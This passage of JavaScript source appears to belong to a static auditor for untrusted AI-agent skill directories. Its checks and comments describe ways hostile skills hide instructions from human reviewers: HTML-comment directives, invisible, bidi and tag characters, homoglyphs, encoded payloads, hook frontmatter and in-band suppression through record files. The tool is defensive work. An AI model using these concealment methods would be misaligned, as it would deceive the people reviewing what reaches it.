    add(SEV.BLOCK, 'STRUCT-SYMLINK', 'Symlink inside the skill. Its target is read as skill content and is not visible in this directory.', s, null, null);
  }

  // ── config surface: is this even a bare skill? ─────────────────────────────
  const skillFile = files.find((f) => f.rel === 'SKILL.md');
  for (const f of files) {
    const name = basename(f.rel);
    for (const c of CONFIG_ARTEFACTS) {
      if (c.match.test(name)) add(SEV.BLOCK, 'CONFIG-OUTOFSCOPE', c.why, f.rel, null, null);
    }
    const top = f.rel.split('/')[0];
    if (CONFIG_DIRS.has(top)) {
      add(SEV.BLOCK, 'CONFIG-OUTOFSCOPE', `Lives under ${quote(top)}/ — this is a plugin bundle, which this audit does not cover.`, f.rel, null, null);
    } else if (top === CROSS_HARNESS_DIR) {
      if (skillFile) {
        add(SEV.NOTE, 'CONFIG-CROSSHARNESS', `Cross-harness metadata for another agent runtime. Read and scanned like any other file, but the invocation policy it declares is not enforced by this harness — confirm it agrees with SKILL.md rather than assuming it does.`, f.rel, null, null);
      } else {
        add(SEV.BLOCK, 'CONFIG-OUTOFSCOPE', `Lives under ${quote(top)}/ with no SKILL.md at the root — this is a plugin bundle, which this audit does not cover.`, f.rel, null, null);
      }
    }
  }

  // ── structure ─────────────────────────────────────────────────────────────
  let declaredName = null;
  if (!skillFile) {
    add(SEV.BLOCK, 'STRUCT-NOSKILL', 'No SKILL.md at the root. Nothing here can load as a skill.', '.', null, null);
  }

  const texts = new Map();
  for (const f of files) {
    let buf;
    try {
      buf = readFileSync(f.abs);
    } catch {
      add(SEV.REVIEW, 'STRUCT-UNREADABLE', 'File could not be read.', f.rel, null, null);
      continue;
    }
    const archive = archiveKind(buf);
    if (archive) {
      add(
        SEV.BLOCK,
        'STRUCT-ARCHIVE',
        `${archive} archive. Opaque to this scan — nothing here opens it, so every rule in this tool has been applied to none of its contents. Extract it and audit what comes out, or decline the skill. A verdict that does not mention this file has not considered it.`,
        f.rel,
        null,
        `${buf.length} bytes`
      );
      continue;
    }
    if (isBinary(buf)) {
      add(SEV.REVIEW, 'STRUCT-BINARY', 'Binary file. Its contents are not auditable by reading; confirm it is a genuine asset.', f.rel, null, `${buf.length} bytes`);
      continue;
    }
    const text = buf.toString('utf8');
    // The sniff above only inspects the first BINARY_SNIFF_BYTES, so a NUL
    // deeper into an otherwise-textual file slips through as ordinary text.
    // Found by this tool's own source acquiring one at byte 19,414, where it
    // was invisible to every check here while making the file read as binary to
    // grep. A NUL in a text file is never meaningful and is a standard way to
    // make one parser stop reading where another keeps going.
    const nul = text.indexOf(String.fromCharCode(0));
    if (nul !== -1) {
      add(SEV.REVIEW, 'STRUCT-NULBYTE', 'NUL byte inside a text file. Never meaningful in prose or source, and a common way to make one reader stop early while another continues past it.', f.rel, locate(text, nul), `byte ${nul}`);
    }
    texts.set(f.rel, text);
  }

  if (skillFile && texts.has('SKILL.md')) {
    const text = texts.get('SKILL.md');
    if (text.charCodeAt(0) === 0xfeff) {
      add(SEV.NOTE, 'STRUCT-BOM', 'Byte-order mark before the frontmatter. Some parsers will not see the opening ---.', 'SKILL.md', { line: 1, col: 1 }, null);
    }
    const fm = parseFrontmatter(text.replace(/^\uFEFF/, ''));

    if (!fm.ok) {
      add(SEV.BLOCK, 'STRUCT-NOFRONTMATTER', fm.error, 'SKILL.md', { line: 1, col: 1 }, null);
    } else {
      for (const dup of fm.duplicates) {
        add(SEV.BLOCK, 'STRUCT-DUPKEY', `Duplicate frontmatter key "${quote(dup)}". Parsers take the last; a reader takes the first. That gap is exactly where a second description hides.`, 'SKILL.md', null, dup);
      }
      for (const [key, v] of fm.keys) {
        if (SPEC_FRONTMATTER_KEYS.has(key)) continue;
        if (HOOK_FRONTMATTER_KEYS.has(key)) {
          add(SEV.BLOCK, 'CONFIG-HOOKFRONTMATTER', `Frontmatter key "${quote(key)}" registers hooks that run on tool events for the rest of the session, outside the agent's judgment — the same capability a hooks.json file is blocked for.`, 'SKILL.md', { line: v.line, col: 1 }, key);
        } else if (HARNESS_FRONTMATTER_KEYS.has(key)) {
          add(SEV.NOTE, 'STRUCT-NONPORTABLE', `Frontmatter key "${quote(key)}" is a Claude Code extension, not part of the Agent Skills spec. It loads here, but claude.ai upload, the Skills API and package_skill.py reject it with a hard error, so this skill cannot travel to those.`, 'SKILL.md', { line: v.line, col: 1 }, key);
        } else {
          add(SEV.REVIEW, 'STRUCT-UNKNOWNKEY', `Frontmatter key "${quote(key)}" is recognised by neither the Agent Skills spec nor Claude Code. It will be ignored by the loader, which makes it a good hiding place.`, 'SKILL.md', { line: v.line, col: 1 }, key);
        }
      }

      const nameEntry = fm.keys.get('name');
      if (!nameEntry?.value) {
        add(SEV.BLOCK, 'STRUCT-NONAME', 'Frontmatter has no name.', 'SKILL.md', null, null);
      } else {
        const name = nameEntry.value;
        declaredName = name;
        if (!NAME_PATTERN.test(name)) {
          add(SEV.REVIEW, 'STRUCT-BADNAME', 'Name must be lowercase letters, digits and hyphens only.', 'SKILL.md', { line: nameEntry.line, col: 1 }, name);
        }
        if (name.length > MAX_NAME_LENGTH) {
          add(SEV.REVIEW, 'STRUCT-LONGNAME', `Name exceeds ${MAX_NAME_LENGTH} characters.`, 'SKILL.md', { line: nameEntry.line, col: 1 }, `${name.length} chars`);
        }
        if (name !== basename(root)) {
          add(SEV.NOTE, 'STRUCT-NAMEMISMATCH', `Frontmatter name "${quote(name)}" differs from the directory name "${basename(root)}". Harmless, but it makes the skill hard to find by either name.`, 'SKILL.md', { line: nameEntry.line, col: 1 }, null);
        }
      }

      const descEntry = fm.keys.get('description');
      if (!descEntry?.value) {
        add(SEV.BLOCK, 'STRUCT-NODESC', 'Frontmatter has no description. The description is the only thing an agent sees when deciding to load the skill.', 'SKILL.md', null, null);
      } else {
        const d = descEntry.value;
        const loc = { line: descEntry.line, col: 1 };
        if (d.length > MAX_DESCRIPTION_LENGTH) {
          add(SEV.REVIEW, 'STRUCT-LONGDESC', `Description exceeds ${MAX_DESCRIPTION_LENGTH} characters and will be rejected by the platform validator.`, 'SKILL.md', loc, `${d.length} chars`);
        }
        if (d.includes('<') || d.includes('>')) {
          add(SEV.REVIEW, 'STRUCT-DESCANGLE', 'Description contains angle brackets, which the platform validator rejects and which can smuggle markup into the index.', 'SKILL.md', loc, null);
        }
        if (d.length < MIN_DESCRIPTION_LENGTH) {
          add(SEV.NOTE, 'STRUCT-SHORTDESC', `Description is ${d.length} characters. Too thin to trigger reliably — it needs the words someone would actually be using at that moment.`, 'SKILL.md', loc, d);
        }
        const breadth = d.match(/\b(?:always|any\s+(?:task|request|time|question)|all\s+(?:tasks|requests|code)|every\s+(?:task|time|request)|whenever\s+possible)\b/gi);
        if (breadth) {
          add(SEV.REVIEW, 'STRUCT-TRIGGERBREADTH', 'Description claims a universal trigger. A skill that loads for everything crowds out the ones that should have loaded, and is the cheapest way to get untrusted text into every session.', 'SKILL.md', loc, breadth.join(', '));
        }
      }

      if (fm.keys.has('allowed-tools')) {
        const v = fm.keys.get('allowed-tools');
        const wild = /\*|Bash\s*$|Bash\s*\(/.test(v.value);
        add(
          wild ? SEV.BLOCK : SEV.REVIEW,
          'CONFIG-ALLOWEDTOOLS',
          wild
            ? 'Grants broad or wildcard tool access from frontmatter. This is a permission grant written by the skill author, not by you.'
            : 'Declares tool permissions. Confirm each one is needed for the stated job.',
          'SKILL.md',
          { line: v.line, col: 1 },
          v.value
        );
      }

      const body = text.slice(fm.bodyOffset ?? 0);
      const words = body.split(/\s+/).filter(Boolean).length;
      if (words > MAX_BODY_WORDS) {
        add(SEV.NOTE, 'STRUCT-LONGBODY', `SKILL.md body is ~${words} words. Past roughly ${MAX_BODY_WORDS} it stops being read in full; move depth into references/.`, 'SKILL.md', null, null);
      }
    }
  }

  // ── referenced vs present ─────────────────────────────────────────────────
  const escapeRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const selfNames = [basename(root), declaredName].filter(Boolean);
  const selfNameAlt = selfNames.map(escapeRe).join('|');

  // House convention requires a skill to invoke its own scripts by absolute
  // path, so its spine cites `~/.claude/skills/<self>/scripts/foo.mjs`. The
  // slash-chain guard below correctly rejects that as a local path — the tail
  // is preceded by `<self>/` — which silently reclassified every properly
  // written skill's own scripts as unreferenced. Collected explicitly here.
  const selfAbsRe = selfNames.length
    ? new RegExp(`skills/(?:${selfNameAlt})/((?:references|scripts|assets|examples)/[A-Za-z0-9._/-]+)`, 'g')
    : null;

  // A path token has a BASE — the directory it is written relative to — and
  // this collector never computed one. It resolved every directory-prefixed
  // token it saw against the audited root, from whatever file it appeared in.
  // For the artefact's own files that assumption is the skill's own convention
  // and it holds. For a record file it is false by construction: an AUDIT.md is
  // prose about an audit that ran somewhere else, so it cites the auditor's own
  // bundle, scratch directories that no longer exist, and phantom paths quoted
  // out of earlier findings. All three were reported as dead references
  // belonging to the audited skill, naming files it never claimed to have.
  //
  // The fix is to make the base explicit, not to exempt the file:
  //
  //   · UNANCHORED — a bare `<dir>/<file>` token, whose base is assumed.
  //     Collected from the artefact's own files. Not collected from a record
  //     file, because there the assumption IS the defect.
  //   · ANCHORED — `skills/<self>/<dir>/<file>`, which writes its base down.
  //     Collected everywhere, records included, so a record naming the skill it
  //     is about can still report a file that skill has since lost.
  //
  // And one asymmetry that is a security property rather than an ergonomic one:
  // a record may ACCUSE but may never VOUCH. Its citations feed STRUCT-DEADREF
  // and nothing else — they never satisfy STRUCT-ORPHAN or STRUCT-UNNAMED. A
  // record travels inside the artefact, and in an incoming skill it is written
  // by whoever wrote the skill, so letting it mark a file as "pointed at" is an
  // in-band suppression pragma reached through a filename — the exact mechanism
  // this tool refuses to provide as a comment. It was reachable: a skill with one
  // unreferenced file under references/ reported STRUCT-ORPHAN at REVIEW, and
  // adding an AUDIT.md that named that file dropped it to no findings at all.
  const mentioned = new Map(); // path → the file that referenced it
  const cited = new Map(); // path → the record that cited it; feeds STRUCT-DEADREF only
  const mentionedDirs = new Set();
  for (const [referrer, text] of texts) {
    if (RECORD_FILES.has(referrer)) continue; // collected below, with less authority
    // The two lookbehinds keep prose out of the path collector. Without them,
    // "the browser loads/scripts/paints" yields a reference to `scripts/paints`
    // and then a dead-reference finding for a file that was never claimed to
    // exist. The second lookbehind is the one that does the work — it rejects a
    // segment sitting inside a longer word/slash chain, while still allowing a
    // genuine relative path written as `./scripts/foo.mjs`.
    for (const m of text.matchAll(/(?<![A-Za-z0-9_-])(?<!\w\/)(?:references|scripts|assets|examples)\/[A-Za-z0-9._/-]+/g)) {
      // Trailing sentence punctuation is part of the prose, not the path.
      // Without this, "see references/adjudication.md." is collected with the
      // full stop attached and then reported as a dead reference — a phantom
      // finding that points at a file which does exist.
      const path = m[0].replace(/[.,;:!?)\]}'"]+$/, '');
      if (path.endsWith('/')) continue; // a bare directory mention; handled below
      if (!mentioned.has(path)) mentioned.set(path, referrer);
    }
    if (selfAbsRe) {
      for (const m of text.matchAll(selfAbsRe)) {
        const path = m[1].replace(/[.,;:!?)\]}'"]+$/, '');
        if (path.endsWith('/')) continue;
        if (!mentioned.has(path)) mentioned.set(path, referrer);
      }
    }
    for (const m of text.matchAll(/\b(references|scripts|assets|examples)\//g)) mentionedDirs.add(m[1]);
  }
  // The record files, separately: only their ANCHORED citations resolve, and
  // those land in `cited`, which no vouching rule reads.
  for (const rel of RECORD_FILES) {
    const text = texts.get(rel);
    if (!text || !selfAbsRe) continue;
    for (const m of text.matchAll(selfAbsRe)) {
      const path = m[1].replace(/[.,;:!?)\]}'"]+$/, '');
      if (path.endsWith('/')) continue;
      if (!cited.has(path)) cited.set(path, rel);
    }
  }
  // The spine wins the attribution where both name the same path, because that
  // is the file whose reference is broken and the file someone would fix.
  const referenced = new Map(cited);
  for (const [ref, referrer] of mentioned) referenced.set(ref, referrer);
  // Attributed to the file that made the reference, not to the missing path.
  // Reporting the missing path as the location gave a filename that cannot be
  // opened, no indication of where to fix it, and — since exclusion matches on
  // the finding's file — made a dead reference inside an excluded file
  // impossible to set aside.
  for (const [ref, referrer] of referenced) {
    if (!texts.has(ref) && !files.some((f) => f.rel === ref)) {
      add(SEV.NOTE, 'STRUCT-DEADREF', `References ${quote(ref)}, which does not exist. Either the skill is incomplete, or it was trimmed without updating the spine.`, referrer, null, ref);
    }
  }
  // Graduated, because a spine that says "the templates in assets/" without
  // naming each file is a normal way to write and not a smuggling signal. The
  // finding that carries weight is a file in a directory nobody mentions at all.
  for (const f of files) {
    const dir = f.rel.match(/^(references|scripts|assets|examples)\//)?.[1];
    if (!dir || mentioned.has(f.rel)) continue;
    if (mentionedDirs.has(dir)) {
      add(SEV.NOTE, 'STRUCT-UNNAMED', `Not named individually, though ${quote(dir)}/ is referenced. Confirm it is one of the files the spine means.`, f.rel, null, null);
    } else {
      add(SEV.REVIEW, 'STRUCT-ORPHAN', `Nothing in this skill mentions ${quote(dir)}/ at all. A file nobody points at is either dead weight or a payload staged for something else to find.`, f.rel, null, null);
    }
  }

  // ── instruction surface ───────────────────────────────────────────────────
  for (const [rel, text] of texts) {
    for (const p of INSTRUCTION_PATTERNS) {
      for (const m of text.matchAll(p.re)) {
        add(p.sev, p.code, p.why, rel, locate(text, m.index), excerpt(text, m.index, m[0].length));
      }
    }

    // The same rules again, against the folded text — and ONLY the findings the
    // raw pass missed. A rule that matched above is not reported twice; the
    // interesting case is a rule that matches only after folding, because that
    // is a directive written to survive a reader and not a scanner.
    //
    // No line number is offered. NFKC changes lengths, so an index into the
    // folded string does not point where it would in the file, and a confident
    // wrong location is worse than none — the matched text is quoted instead.
    const folded = foldToAscii(text);
    if (folded !== text) {
      for (const p of [...INSTRUCTION_PATTERNS, ...EXECUTION_PATTERNS]) {
        const bare = () => new RegExp(p.re.source, p.re.flags.replace('g', ''));
        if (bare().test(text)) continue;
        const m = bare().exec(folded);
        if (!m) continue;
        add(
          SEV.BLOCK,
          'INSTR-OBFUSCATED',
          `Matches ${p.code} only after Unicode folding. The characters are not ASCII; what they spell is. ${p.why}`,
          rel,
          null,
          excerpt(m[0], 0, m[0].length, 80)
        );
      }
    }

    // Invisible and direction-controlling characters. These are the ones that
    // make a file read differently to a human than to a model, which is the
    // whole game — an inspection that "looked fine" is not evidence.
    for (const m of text.matchAll(INVISIBLE_RE)) {
      if (m.index === 0 && m[0] === '\uFEFF') continue; // reported as STRUCT-BOM
      add(SEV.BLOCK, 'INSTR-INVISIBLE', 'Zero-width or invisible character. It renders as nothing and can carry text the reviewer never sees.', rel, locate(text, m.index), `U+${m[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`);
    }
    for (const m of text.matchAll(BIDI_RE)) {
      add(SEV.BLOCK, 'INSTR-BIDI', 'Bidirectional control character. Reorders displayed text, so the line you read is not the line that is parsed.', rel, locate(text, m.index), `U+${m[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`);
    }
    for (const m of text.matchAll(/[\u{E0000}-\u{E007F}]/gu)) {
      add(SEV.BLOCK, 'INSTR-TAGCHARS', 'Unicode tag character. This block encodes ASCII invisibly and exists in the wild for exactly one purpose.', rel, locate(text, m.index), `U+${m[0].codePointAt(0).toString(16).toUpperCase()}`);
    }

    // Homoglyphs only matter where a character is read as an identifier, so this
    // is scoped to code spans and to the confusables table.
    //
    // Two wider versions were tried first and both were unusable on a known-good
    // skill: every non-ASCII character fired on em dashes and ✗ marks in prose
    // tables, and every non-ASCII *letter* still fired on each Δ in a colour
    // script. Neither is confusable with anything; both buried the real class.
    const spans = codeSpans(text);
    for (const m of text.matchAll(/[^\x00-\x7F]/g)) {
      if (!inRanges(m.index, spans)) continue;
      const looksLike = CONFUSABLES.get(m[0]);
      if (!looksLike) continue;
      const cp = `U+${m[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}`;
      add(SEV.REVIEW, 'INSTR-HOMOGLYPH', `Renders as ASCII "${looksLike}" but is not. A substituted character silently changes which binary, flag or path a command names.`, rel, locate(text, m.index), `${cp} reads as "${looksLike}"`);
    }

    for (const m of text.matchAll(/<!--([\s\S]*?)-->/g)) {
      const inner = m[1];
      const hostile = hostileIn(inner);
      if (hostile) {
        // Concealment PRESERVES severity, it does not manufacture it. A hidden
        // INSTR-OVERRIDE is still a block; a hidden EXEC-HOMEPATH is still the
        // review it would be in the open, reported as hidden because that is
        // the added information.
        //
        // Found by this repo's own audit gate going red on skills/skill-adopt:
        // widening this check to the execution rules (SK-85, criterion 4) made
        // every REVIEW-severity execution pattern inside a comment escalate to
        // BLOCK, and promote.test.mjs legitimately builds a hostile fixture
        // containing exactly that. The rule was right and its severity was not.
        add(hostile.sev === SEV.BLOCK ? SEV.BLOCK : SEV.REVIEW, 'INSTR-HIDDENDIRECTIVE', `HTML comment containing ${hostile.code}. Invisible when rendered, fully present in context.`, rel, locate(text, m.index), excerpt(inner, 0, inner.length));
      } else if (/\b(?:you\s+must|always|never|do\s+not|run|execute|fetch|read\s+the)\b/i.test(inner)) {
        add(SEV.REVIEW, 'INSTR-HTMLCOMMENT', 'HTML comment written as an instruction. Comments are invisible in rendered Markdown but reach the model intact.', rel, locate(text, m.index), excerpt(inner, 0, inner.length));
      }
    }

    for (const m of text.matchAll(new RegExp(`[A-Za-z0-9+/]{${BASE64_MIN_RUN},}={0,2}`, 'g'))) {
      if (isPathLike(m[0])) continue; // a path, not an encoding — see isPathLike
      if (/^[0-9a-fA-F]+$/.test(m[0])) {
        const hex = decodeHexRun(m[0]);
        if (!hex) continue; // a digest — see decodeHexRun
        const hexHostile = hostileIn(hex);
        add(
          hexHostile ? SEV.BLOCK : SEV.REVIEW,
          hexHostile ? 'INSTR-ENCODEDPAYLOAD' : 'INSTR-HEXBLOB',
          hexHostile ? `Hex run decoding to text matching ${hexHostile.code}.` : 'Hex run decoding to readable text. Decode it and read what it says.',
          rel,
          locate(text, m.index),
          excerpt(hex, 0, hex.length, 60)
        );
        continue;
      }
      const decoded = decodeBase64(m[0]);
      const hostile = decoded && hostileIn(decoded);
      if (hostile) {
        add(SEV.BLOCK, 'INSTR-ENCODEDPAYLOAD', `Base64 run decoding to text matching ${hostile.code}.`, rel, locate(text, m.index), excerpt(decoded, 0, decoded.length));
      } else {
        add(SEV.REVIEW, 'INSTR-BASE64', decoded ? 'Base64 run decoding to readable text. Decode it and read what it says.' : 'Long base64-like run. Confirm it is data the skill genuinely needs inline.', rel, locate(text, m.index), decoded ? excerpt(decoded, 0, decoded.length, 60) : `${m[0].length} chars`);
      }
    }

    for (const m of text.matchAll(/(?:\\x[0-9a-fA-F]{2}){8,}|(?:\\u[0-9a-fA-F]{4}){6,}/g)) {
      add(SEV.REVIEW, 'INSTR-HEXESC', 'Long escape-encoded run. Obscures its own contents from a reader.', rel, locate(text, m.index), excerpt(text, m.index, m[0].length, 60));
    }
  }

  // ── execution surface ─────────────────────────────────────────────────────
  // A skill is required by house convention to invoke its own scripts by
  // absolute path, so every well-formed skill contains ~/.claude/skills/<self>/.
  // Flagging that is flagging the convention, not a finding.
  // Trailing `(?![\w-])` rather than `/`, so a bare `~/.claude/skills/<name>`
  // at end of line — exactly how the install command is written — still counts
  // as a self-reference.
  const selfRef = selfNames.length ? new RegExp(`skills/(?:${selfNameAlt})(?![\\w-])`) : null;

  const CODE_EXT = new Set(['.mjs', '.cjs', '.js', '.ts', '.py', '.sh', '.bash', '.zsh', '.rb', '.pl']);
  for (const [rel, text] of texts) {
    const isCode = rel.startsWith('scripts/') || CODE_EXT.has(extname(rel));
    // Fenced blocks only in Markdown. Inline `~/foo` in a sentence is a
    // citation; a fenced block is something a reader may copy and run.
    const spans = isCode ? null : fencedSpans(text);

    // Because execution patterns are scoped to fences, a Markdown file whose
    // code is NOT fenced receives no execution scanning at all — and reports
    // clean, which is indistinguishable from being clean. That gap was found the
    // hard way: a skill arrived here with every fence stripped in transit, and
    // its code was invisible to this tool until the whole document was forced
    // through the patterns by hand. Report the blind spot rather than inherit it.
    if (!isCode && extname(rel) === '.md') {
      let offset = 0;
      let unfenced = 0;
      let firstLine = null;
      for (const line of text.split('\n')) {
        if (!inRanges(offset, spans) && CODE_SHAPED_RE.test(line)) {
          unfenced++;
          if (firstLine === null) firstLine = locate(text, offset);
        }
        offset += line.length + 1;
      }
      if (unfenced >= UNFENCED_CODE_MIN) {
        add(
          SEV.REVIEW,
          'STRUCT-UNFENCEDCODE',
          `${unfenced} code-shaped lines sit outside any fenced block. Execution-surface patterns apply only inside fences in Markdown, so this file's code was NOT scanned — a clean result here means unexamined, not safe. Re-fence it and re-run, or audit the code by hand.`,
          rel,
          firstLine,
          `${unfenced} lines, ${spans.length} fenced block(s)`
        );
      }
    }
    for (const p of EXECUTION_PATTERNS) {
      for (const m of text.matchAll(p.re)) {
        if (spans && !inRanges(m.index, spans)) continue;
        if (p.code === 'EXEC-HOMEPATH') {
          const ahead = text.slice(m.index, m.index + 120);
          // The skill's own scripts, by the house convention.
          if (selfRef && selfRef.test(ahead)) continue;
          // Another skill's bundled script. Skills are required to invoke
          // scripts by absolute path, so citing a sibling's script — which every
          // audit record does, since it prints the command that produced it — is
          // the convention rather than a reach outside the sandbox. Narrowed to
          // `scripts/`: `~/.claude/skills/other/secrets.txt` is still reported.
          if (BUNDLED_SCRIPT_RE.test(ahead)) continue;
        }
        add(p.sev, p.code, p.why, rel, locate(text, m.index), excerpt(text, m.index, m[0].length));
      }
    }
    if (!isCode) continue;
    for (const m of text.matchAll(/^\s*(?:import\s[\s\S]*?from\s+|const\s+.*?=\s*require\s*\(\s*)['"]([^'".][^'"]*)['"]/gm)) {
      if (m[1].startsWith('node:')) continue;
      add(SEV.REVIEW, 'EXEC-DEPENDENCY', 'Imports a package that is not a Node builtin. A skill that needs an install will not run when it is needed, and pulls in code outside this audit.', rel, locate(text, m.index), m[1]);
    }
  }

  findings.sort((a, b) => SEV_RANK[a.sev] - SEV_RANK[b.sev] || a.file.localeCompare(b.file) || (a.line ?? 0) - (b.line ?? 0));

  // Excluded files are scanned like any other; exclusion changes only where the
  // findings are attributed and whether they set the exit code. Nothing is
  // skipped, so a payload hidden in an excluded file is still printed.
  for (const f of findings) f.excluded = isExcluded(f.file);

  return {
    fatal: null,
    findings,
    files: files.map((f) => f.rel),
    symlinks,
    excludedFiles: files.map((f) => f.rel).filter(isExcluded)
  };
}

export function summarise(findings) {
  const counts = { BLOCK: 0, REVIEW: 0, NOTE: 0 };
  for (const f of findings) if (!f.excluded) counts[f.sev]++;
  const excluded = findings.filter((f) => f.excluded).length;
  const verdict = counts.BLOCK > 0 ? 'DO NOT ADOPT' : counts.REVIEW > 0 ? 'ADOPT ONLY AFTER REVIEW' : 'NO BLOCKING FINDINGS';
  return { counts, excluded, verdict, exitCode: counts.BLOCK ? 2 : counts.REVIEW ? 1 : 0 };
}

// ── CLI ──────────────────────────────────────────────────────────────────────

const USAGE = `audit-skill — static audit of an untrusted skill directory

  ${invokedAs()} <skill-dir> [--json] [--quiet] [--no-evidence] [--exclude <glob>]…

  --json            machine-readable findings
  --quiet           suppress NOTE-level findings
  --no-evidence     withhold the matched bytes. Each finding keeps its severity,
                    code, file, location and reason; the excerpt of what
                    matched is not printed, and a reason that would quote the
                    artefact says [withheld] instead. Counts, verdict and exit
                    code are unchanged — the flag changes what is shown, never
                    what was found. Under --json every finding's evidence is
                    null and the top level says "evidence": "withheld".

                    For the reader that is an agent. An excerpt is text the
                    artefact's author chose, and printing it into an agent's
                    context is the thing intake kept out of it (THREATS.md).
                    A flag, deliberately, and not a test of whether stdout is
                    a terminal: a report must not mean different things
                    depending on what it is piped into.

                    What it cannot withhold is the file name — a location
                    cannot be withheld from a report about a location, and the
                    artefact named its own files.
  --exclude <glob>  attribute findings in matching files separately, and keep
                    them out of the exit code. Repeatable. Matches a relative
                    path or a bare filename; * and ** are supported.

                    Excluded files are still READ AND SCANNED — exclusion moves
                    where a finding is reported, never whether it is. The count
                    is always printed. Use it for an AUDIT.md you wrote, which
                    necessarily cites hashes and commands; excluding anything
                    else is a judgment you are signing for.

                    Deliberately a command-line flag and not a marker inside the
                    skill: an in-band exemption would be written by whoever wrote
                    the file, which in the case this tool exists for is the
                    attacker.

                    Not needed for STRUCT-DEADREF. A record file (AUDIT.md,
                    ORIGIN.md) states no base for an unanchored path, so the
                    reference graph does not resolve one against the skill root,
                    and a record never vouches for a file that would otherwise
                    be an orphan. That is a DEFAULT: it is arithmetic
                    the scanner was getting wrong for every skill, and there is
                    nothing for a human to sign. Judging that a record's OTHER
                    findings — its hashes, its home paths — belong to the record
                    rather than to the artefact stays PER-INVOCATION, because
                    that is a judgment about content, and only a human can make
                    it.

Exit codes:  0 clean or notes only · 1 review needed · 2 blocking finding

Reads only. Never executes the target, follows a symlink out of it, or makes a
network call. Findings are evidence for a decision, not the decision — a match
is a question to answer, and the answer belongs in the audit report.
`;

/**
 * True when this file was invoked as the CLI rather than imported.
 *
 * Compared as realpaths, not as URLs. Node resolves `import.meta.url` through
 * symlinks while `process.argv[1]` keeps the path as typed, so the obvious
 * `import.meta.url === pathToFileURL(process.argv[1]).href` is false whenever
 * the script is reached through a link — which is the documented way to install
 * this skill. The symptom was the worst one this tool can have: no output, exit
 * 0, indistinguishable from a clean audit.
 */
function invokedAsScript() {
  if (!process.argv[1]) return false;
  try {
    return realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url));
  } catch {
    return false;
  }
}

if (invokedAsScript()) {
  const args = process.argv.slice(2);
  const bad = checkFlags(args, FLAGS);
  if (bad) {
    process.stderr.write(`error: unknown option ${bad.flag}\n`);
    process.stderr.write(
      bad.suggestion ? `  did you mean ${bad.suggestion}?\n` : `  run \`${invokedAs()} --help\` for what this verb takes\n`
    );
    process.exit(2);
  }
  const json = args.includes('--json');
  const quiet = args.includes('--quiet');
  const noEvidence = args.includes('--no-evidence');
  const exclude = [];
  const positional = [];
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--exclude') {
      if (!args[i + 1] || args[i + 1].startsWith('--')) {
        process.stderr.write('error: --exclude needs a pattern\n');
        process.exit(2);
      }
      exclude.push(args[++i]);
    } else if (!args[i].startsWith('--')) {
      positional.push(args[i]);
    }
  }
  const target = positional[0];

  if (!target) {
    process.stdout.write(USAGE);
    process.exit(0);
  }

  const result = auditSkill(target, { exclude, evidence: !noEvidence });
  if (result.fatal) {
    process.stderr.write(`error: ${result.fatal}\n`);
    process.exit(2);
  }

  const visible = quiet ? result.findings.filter((f) => f.sev !== SEV.NOTE) : result.findings;
  const shown = visible.filter((f) => !f.excluded);
  const setAside = visible.filter((f) => f.excluded);
  const { counts, excluded, verdict, exitCode } = summarise(result.findings);

  if (json) {
    process.stdout.write(
      // `evidence` at the top level says whether the null on every finding
      // below is a withheld excerpt or an absent one — a consumer that cannot
      // tell those apart cannot tell a clean scan from a silenced one.
      `${JSON.stringify({ target, counts, excluded, verdict, evidence: noEvidence ? 'withheld' : 'shown', exclude, excludedFiles: result.excludedFiles, findings: visible, files: result.files }, null, 2)}\n`
    );
    process.exit(exitCode);
  }

  // Padded FIRST, coloured second. padEnd on a string that already carries
  // escape sequences counts those bytes as width, and the column quietly
  // collapses for exactly the readers who enabled colour.
  const sevInk = (sev, text) =>
    sev === SEV.BLOCK ? tint.alarm(text) : sev === SEV.REVIEW ? tint.warn(text) : tint.dim(text);

  const line = (f) => {
    const where = f.line ? `${f.file}:${f.line}:${f.col}` : f.file;
    process.stdout.write(`  ${sevInk(f.sev, f.sev.padEnd(6))} ${f.code.padEnd(24)} ${where}\n`);
    if (f.evidence) process.stdout.write(`         ${JSON.stringify(f.evidence)}\n`);
    process.stdout.write(`         ${f.why}\n\n`);
  };

  // Said once, in the header, rather than once per finding: a report that
  // withholds every excerpt and does not say so reads like a scan that found
  // nothing worth quoting.
  process.stdout.write(`\naudit-skill · ${basename(target)} · ${result.files.length} file(s)${noEvidence ? ' · evidence withheld' : ''}\n\n`);
  if (shown.length === 0) process.stdout.write('  no findings\n\n');
  for (const f of shown) line(f);

  if (exclude.length) {
    process.stdout.write(`  ── set aside by --exclude ${exclude.join(' ')} ──\n`);
    process.stdout.write(`  ${result.excludedFiles.length} file(s) matched: ${result.excludedFiles.join(', ') || 'none'}\n`);
    process.stdout.write('  These were scanned. Their findings are listed but do not set the exit code.\n\n');
    for (const f of setAside) line(f);
    if (!setAside.length) process.stdout.write('  (no findings in excluded files)\n\n');
  }

  // A zero count is not news. Only a count that actually found something may
  // spend an ink — "0 block" in alarm red is the interface shouting about the
  // absence of a problem, which is how an alarm colour stops meaning anything.
  const count = (n, word, ink) => (n ? ink(`${n} ${word}`) : tint.dim(`${n} ${word}`));
  process.stdout.write(
    `  ${count(counts.BLOCK, 'block', tint.alarm)} · ${count(counts.REVIEW, 'review', tint.warn)} · ${tint.dim(`${counts.NOTE} note`)}`
  );
  // The newline stays OUTSIDE the ink. Wrapping it puts the reset sequence at
  // the start of the next line, which is harmless in a terminal and ugly in a
  // captured log — and this is the only line in the file that could get it
  // wrong, because it is the only one whose text ends the row.
  process.stdout.write(excluded ? `${tint.dim(` · ${excluded} set aside`)}\n` : '\n');
  // The verdict is the one state word this command prints, so it is the one
  // place the flag itself is spent — and only when the answer is that nothing
  // is blocking. A verdict of DO NOT ADOPT is not a cleared vessel.
  const verdictInk = counts.BLOCK ? tint.alarm : counts.REVIEW ? tint.warn : tint.state;
  process.stdout.write(`  verdict: ${verdictInk(verdict)}\n\n`);
  process.exit(exitCode);
}
